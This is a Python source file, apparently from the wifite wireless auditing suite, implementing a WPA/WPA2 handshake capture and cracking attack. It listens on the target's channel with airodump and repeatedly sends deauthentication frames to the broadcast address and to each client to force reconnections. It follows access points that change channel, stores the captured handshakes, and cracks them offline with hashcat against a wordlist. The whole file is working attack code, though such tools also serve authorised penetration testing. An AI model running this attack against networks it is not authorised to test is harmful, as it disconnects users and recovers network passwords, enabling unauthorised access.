#!/usr/bin/env python
# -*- coding: utf-8 -*-

from ..model.attack import Attack
from ..tools.aircrack import Aircrack
from ..tools.hashcat import Hashcat
from ..tools.airodump import Airodump
from ..tools.aireplay import Aireplay
from ..config import Configuration
from ..util.color import Color
from ..util.timer import Timer
from ..model.handshake import Handshake
from ..model.wpa_result import CrackResultWPA
import time
import os
import re
from shutil import copy

# Seconds without seeing the target before attempting a channel-relocation scan
CHANNEL_RECHECK_SECONDS = 5
# Duration (seconds) of the band-hopping scan used to relocate a moved target
RELOCATION_SCAN_SECONDS = 8


class AttackWPA(Attack):
    def __init__(self, target):
        super(AttackWPA, self).__init__(target)
        self.clients = []
        self.crack_result = None
        self.success = False

    def run(self):
        """Initiates full WPA handshake capture attack."""

        # Skip if target is not WPS
        if Configuration.wps_only and self.target.wps is False:
            Color.pl('\r{!} {O}Skipping WPA-Handshake attack on {R}%s{O} because {R}--wps-only{O} is set{W}'
                     % self.target.essid)
            self.success = False
            return self.success

        # Skip if user only wants to run PMKID attack
        if Configuration.use_pmkid_only:
            self.success = False
            return False

        # Inform the user what kind of WPA3 target we are dealing with, since
        # the cracking outlook differs fundamentally between the two:
        if getattr(self.target, 'is_transition_mode', False):
            Color.pl('{+} {C}Target is in {P}WPA2/WPA3 transition mode{C}. Deauthentication should force '
                     'clients onto WPA2-PSK, yielding a crackable handshake.{W}')
        elif getattr(self.target, 'is_wpa3_only', False):
            Color.pl('{!} {O}Target is {P}WPA3-only{O} ({P}SAE{O}). Pure SAE resists offline dictionary '
                     'attacks; a captured handshake may be uncrackable.{W}')

        # Capture the handshake (or use an old one)
        handshake = self.capture_handshake()

        if handshake is None:
            # Failed to capture handshake
            self.success = False
            return self.success

        # Analyze handshake
        Color.pl('\n{+} analysis of captured handshake file:')
        handshake.analyze()

        # Check for the --skip-crack flag
        if Configuration.skip_crack:
            return self._extracted_from_run_30(
                '{+} Not cracking handshake because {C}skip-crack{W} was used{W}'
            )
        # Check wordlist
        if Configuration.wordlist is None:
            return self._extracted_from_run_30(
                '{!} {O}Not cracking handshake because wordlist ({R}--dict{O}) is not set'
            )
        elif not os.path.exists(Configuration.wordlist):
            Color.pl('{!} {O}Not cracking handshake because wordlist {R}%s{O} was not found' % Configuration.wordlist)
            self.success = False
            return False

        # Determine if the target is *pure* WPA3-SAE.
        # Transition-mode networks (WPA2+WPA3) are NOT treated as pure-SAE:
        # deauthed clients normally reassociate over WPA2-PSK, producing a
        # PBKDF2-derived handshake that hashcat mode 22000 CAN crack offline.
        target_is_wpa3_sae = self.target.primary_authentication == 'SAE' and \
                             not getattr(self.target, 'is_transition_mode', False)

        cracker = "Hashcat" # Default to Hashcat
        # TODO: Potentially add a fallback or user choice for aircrack-ng for non-SAE?
        # For now, transitioning WPA/WPA2 cracking to Hashcat as well for consistency,
        # as Hashcat mode 22000 (unified EAPOL/PMKID format) is generally preferred over aircrack-ng.
        # Aircrack.crack_handshake might be removed or kept for WEP only in future.

        Color.pl(f'\n{{+}} {{C}}Cracking {"WPA3-SAE" if target_is_wpa3_sae else "WPA/WPA2"} Handshake:{{W}} Running {{C}}{cracker}{{W}} with '
                 f'{{C}}{os.path.split(Configuration.wordlist)[-1] if Configuration.wordlist else "default wordlist"}{{W}} wordlist')

        try:
            key = Hashcat.crack_handshake(handshake, target_is_wpa3_sae, show_command=Configuration.verbose > 1)
        except ValueError as e: # Catch errors from hash file generation (e.g. bad capture)
            Color.pl(f"[!] Error during hash file generation for cracking: {e}")
            key = None

        if key is None:
            Color.pl(f"{{!}} {{R}}Failed to crack handshake:{{W}} {Configuration.wordlist.split(os.sep)[-1] if Configuration.wordlist else 'Wordlist'} did not contain password")
            self.success = False
        else:
            Color.pl(f"[+] Cracked {'WPA3-SAE' if target_is_wpa3_sae else 'WPA/WPA2'} Handshake Key: {key}\n")
            self.crack_result = CrackResultWPA(handshake.bssid, handshake.essid, handshake.capfile, key)
            self.crack_result.dump()
            self.success = True
        return self.success

    # TODO Rename this here and in `run`
    def _extracted_from_run_30(self, arg0):
        Color.pl(arg0)
        self.success = False
        return False

    def capture_handshake(self):
        """Returns captured or stored handshake, otherwise None."""
        handshake = None

        # Fast-path: reuse a stored handshake BEFORE touching the radio
        if not Configuration.ignore_old_handshakes:
            handshake = self.load_handshake(
                bssid=self.target.bssid,
                essid=self.target.essid if self.target.essid_known else None)
            if handshake:
                Color.pl('{+} Using {G}existing handshake{W}: {C}%s{W}' % handshake.capfile)
                return handshake

        timeout_timer = Timer(Configuration.wpa_attack_timeout)
        current_channel = str(self.target.channel)

        while handshake is None and not timeout_timer.ended():
            # Each iteration tunes the adapter to `current_channel`.
            # When a channel-hopping target relocates, this loop re-enters
            # on the newly-discovered channel (see relocate_target_channel).
            result, data = self._capture_on_channel(current_channel, timeout_timer)
            if result == 'handshake':
                handshake = data
            elif result == 'retune':
                current_channel = str(data)
            else:
                break

        if handshake is None:
            Color.pl('\n{!} {O}WPA handshake capture {R}FAILED:{O} Timed out after %d seconds' % (
                Configuration.wpa_attack_timeout))
        else:
            self.save_handshake(handshake)

        return handshake

    def _capture_on_channel(self, current_channel, timeout_timer):
        """
        Listens on ONE channel until either a handshake is captured
        ('handshake'), the target is found on another channel ('retune'),
        or capture must stop ('fail').
        """
        with Airodump(channel=current_channel,
                      target_bssid=self.target.bssid,
                      skip_wps=True,
                      output_file_prefix='wpa') as airodump:

            Color.clear_entire_line()
            Color.pattack('WPA', self.target, 'Handshake capture',
                          'Listening on channel {C}%s{W}...' % current_channel)
            try:
                airodump_target = self.wait_for_target(airodump)
            except Exception as e:
                Color.pl('\n{!} {O}Target not seen on channel {C}%s{O}: %s' % (current_channel, str(e)))
                new_channel = self.relocate_target_channel()
                if new_channel and str(new_channel) != str(current_channel):
                    return ('retune', new_channel)
                return ('fail', None)

            self.clients = []

            deauth_timer = Timer(Configuration.wpa_deauth_timeout)
            initial_deauth_sent = False
            last_seen = time.time()

            while handshake is None and not timeout_timer.ended():
                step_timer = Timer(1)
                Color.clear_entire_line()
                Color.pattack('WPA',
                              airodump_target,
                              'Handshake capture',
                              'Listening. (clients:{G}%d{W}, deauth:{O}%s{W}, timeout:{R}%s{W})' % (
                                  len(self.clients), deauth_timer, timeout_timer))

                # Find .cap file
                cap_files = airodump.find_files(endswith='.cap')
                if len(cap_files) == 0:
                    # No cap files yet
                    time.sleep(step_timer.remaining())
                    continue
                cap_file = cap_files[0]

                # Copy .cap file to temp for consistency
                temp_file = Configuration.temp('handshake.cap.bak')

                # Check file size before copying to prevent memory issues
                try:
                    file_size = os.path.getsize(cap_file)
                    max_cap_size = 50 * 1024 * 1024  # 50MB limit
                    if file_size > max_cap_size:
                        Color.pl('\n{!} {O}Warning: Capture file is large (%d MB), may cause memory issues{W}' % (file_size // (1024*1024)))
                except (OSError, IOError):
                    pass

                copy(cap_file, temp_file)

                # Check cap file in temp for Handshake
                bssid = airodump_target.bssid
                essid = airodump_target.essid if airodump_target.essid_known else None
                handshake = Handshake(temp_file, bssid=bssid, essid=essid)
                if handshake.has_handshake():
                    # We got a handshake
                    Color.clear_entire_line()
                    Color.pattack('WPA',
                                  airodump_target,
                                  'Handshake capture',
                                  '{G}Captured handshake{W}')
                    Color.pl('')
                    return ('handshake', handshake)

                # There is no handshake
                handshake = None
                # Delete copied .cap file in temp to save space
                os.remove(temp_file)

                # Look for new clients
                try:
                    airodump_target = self.wait_for_target(airodump)
                    last_seen = time.time()
                except Exception:
                    # Target vanished from this channel — likely a
                    # channel-hopping / band-steering / DFS AP.
                    if time.time() - last_seen >= CHANNEL_RECHECK_SECONDS:
                        new_channel = self.relocate_target_channel()
                        last_seen = time.time()
                        if new_channel and str(new_channel) != str(current_channel):
                            Color.clear_entire_line()
                            Color.pattack('WPA', self.target, 'Channel follow',
                                          'Target moved {R}%s{W} -> {G}%s{W}' % (
                                              current_channel, new_channel))
                            Color.pl('')
                            return ('retune', new_channel)
                    continue
                for client in airodump_target.clients:
                    if client.station not in self.clients:
                        Color.clear_entire_line()
                        Color.pattack('WPA',
                                      airodump_target,
                                      'Handshake capture',
                                      'Discovered new client: {G}%s{W}' % client.station)
                        Color.pl('')
                        self.clients.append(client.station)

                # FAST deauth: fire immediately as soon as any client is
                # known (instead of waiting the full deauth timeout), then
                # repeat every wpa_deauth_timeout seconds.
                should_deauth = False
                if not initial_deauth_sent and len(self.clients) > 0:
                    should_deauth = True
                    initial_deauth_sent = True
                elif deauth_timer.ended():
                    should_deauth = True

                if should_deauth:
                    self.deauth(airodump_target)
                    # Restart timer
                    deauth_timer = Timer(Configuration.wpa_deauth_timeout)

                # Sleep for at-most 1 second
                time.sleep(step_timer.remaining())

        # Timed out on this channel without capturing a handshake
        return ('fail', None)

    def relocate_target_channel(self):
        """
        Briefly hops across bands (filtered to this target's BSSID only) to
        discover which channel a moving/channel-hopping AP is now using.
        Returns the new channel, or None if the target was not found.
        """
        saved = (Configuration.target_channel, Configuration.all_bands,
                 Configuration.two_ghz, Configuration.five_ghz)
        try:
            # Force an unrestricted, channel-hopping scan for just our BSSID
            Configuration.target_channel = None
            Configuration.all_bands = True
            Configuration.two_ghz = True
            Configuration.five_ghz = True

            with Airodump(target_bssid=self.target.bssid,
                          skip_wps=True,
                          output_file_prefix='wpa_relock') as airodump:
                timer = Timer(RELOCATION_SCAN_SECONDS)
                while not timer.ended():
                    time.sleep(0.5)
                    for target in airodump.get_targets():
                        if target.bssid.lower() == self.target.bssid.lower():
                            return target.channel
        except Exception as e:
            if Configuration.verbose > 0:
                Color.pl('\n{!} {O}Channel relocation scan failed: %s{W}' % str(e))
        finally:
            (Configuration.target_channel, Configuration.all_bands,
             Configuration.two_ghz, Configuration.five_ghz) = saved
        return None

    @staticmethod
    def load_handshake(bssid, essid):
        if not os.path.exists(Configuration.wpa_handshake_dir):
            return None

        if essid:
            essid_safe = re.escape(re.sub('[^a-zA-Z0-9]', '', essid))
        else:
            essid_safe = '[a-zA-Z0-9]+'
        bssid_safe = re.escape(bssid.replace(':', '-'))
        date = r'\d{4}-\d{2}-\d{2}T\d{2}-\d{2}-\d{2}'
        get_filename = re.compile(r'handshake_%s_%s_%s\.cap' % (essid_safe, bssid_safe, date))

        for filename in os.listdir(Configuration.wpa_handshake_dir):
            cap_filename = os.path.join(Configuration.wpa_handshake_dir, filename)
            if os.path.isfile(cap_filename) and re.match(get_filename, filename):
                return Handshake(capfile=cap_filename, bssid=bssid, essid=essid)

        return None

    @staticmethod
    def save_handshake(handshake):
        """
            Saves a copy of the handshake file to hs/
            Args:
                handshake - Instance of Handshake containing bssid, essid, capfile
        """
        # Create handshake dir
        if not os.path.exists(Configuration.wpa_handshake_dir):
            os.makedirs(Configuration.wpa_handshake_dir)

        # Generate filesystem-safe filename from bssid, essid and date
        if handshake.essid and type(handshake.essid) is str:
            essid_safe = re.sub('[^a-zA-Z0-9]', '', handshake.essid)
        else:
            essid_safe = 'UnknownEssid'
        bssid_safe = handshake.bssid.replace(':', '-')
        date = time.strftime('%Y-%m-%dT%H-%M-%S')
        cap_filename = f'handshake_{essid_safe}_{bssid_safe}_{date}.cap'
        cap_filename = os.path.join(Configuration.wpa_handshake_dir, cap_filename)

        if Configuration.wpa_strip_handshake:
            Color.p('{+} {C}stripping{W} non-handshake packets, saving to {G}%s{W}...' % cap_filename)
            handshake.strip(outfile=cap_filename)
        else:
            Color.p('{+} saving copy of {C}handshake{W} to {C}%s{W} ' % cap_filename)
            copy(handshake.capfile, cap_filename)
        Color.pl('{G}saved{W}')
        # Update handshake to use the stored handshake file for future operations
        handshake.capfile = cap_filename

    def deauth(self, target):
        """
            Sends deauthentication request to broadcast and every client of target.
            Args:
                target - The Target to deauth, including clients.
        """
        if Configuration.no_deauth:
            return

        for client in [None] + self.clients:
            target_name = '*broadcast*' if client is None else client
            Color.clear_entire_line()
            Color.pattack('WPA',
                          target,
                          'Handshake capture',
                          'Deauthing {O}%s{W}' % target_name)
            Aireplay.deauth(target.bssid, client_mac=client, timeout=2)


if __name__ == '__main__':
    Configuration.initialize(True)
    from ..model.target import Target

    fields = 'A4:2B:8C:16:6B:3A, 2015-05-27 19:28:44, 2015-05-27 19:28:46,  11,  54e,WPA, WPA, , -58,        2' \
             ',        0,   0.  0.  0.  0,   9, Test Router Please Ignore, '.split(',')
    target = Target(fields)
    wpa = AttackWPA(target)
    try:
        wpa.run()
    except KeyboardInterrupt:
        Color.pl('')
    Configuration.exit_gracefully()
